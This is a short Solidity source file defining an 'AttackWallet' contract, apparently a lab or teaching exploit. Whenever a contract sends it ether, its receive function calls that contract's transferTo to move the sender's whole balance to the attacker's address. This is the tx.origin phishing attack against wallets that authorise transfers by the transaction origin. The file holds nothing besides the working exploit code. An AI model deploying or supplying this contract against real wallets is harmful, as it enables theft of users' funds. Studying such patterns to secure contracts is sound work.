// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

interface TestContract {
    function transferTo(address payable dest, uint amount) external;
}

contract AttackWallet {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    receive() external payable {
        TestContract(msg.sender).transferTo(owner, msg.sender.balance);
    }
}